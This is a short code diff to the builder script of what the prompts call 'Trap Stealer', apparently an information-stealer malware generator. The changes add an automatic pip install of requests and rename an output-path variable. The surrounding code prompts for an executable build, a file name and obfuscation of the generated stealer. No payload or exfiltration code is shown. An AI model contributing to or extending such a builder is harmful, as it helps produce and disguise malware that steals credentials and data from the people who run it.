@@ -1,4 +1,10 @@
-import os, platform, subprocess, shutil, random, requests, shutil
+import os, platform, subprocess, shutil, random, shutil
+try:
+    import requests
+except:
+    subprocess.run(f'python -m pip install requests', shell=True, check=True)
+
+import requests
 
 while True:
     os.makedirs('./Build', exist_ok=True)
@@ -95,9 +101,9 @@ while True:
     Exe = input('Do you want to make Trap Stealer with the exe format? (Take some time) Y/N: ')
     Exe = Exe.lower()
     name = input('Enter how you want the file to be named (Do not put the extension): ')
-    output_exe_path = f'./Build/{name}.py'
-    if os.path.exists(output_exe_path):
-        os.remove(output_exe_path)
+    output_py = f'./Build/{name}.py'
+    if os.path.exists(output_py):
+        os.remove(output_py)
     while True:
         if Obfuscation in ['y', 'yes']:
             try:
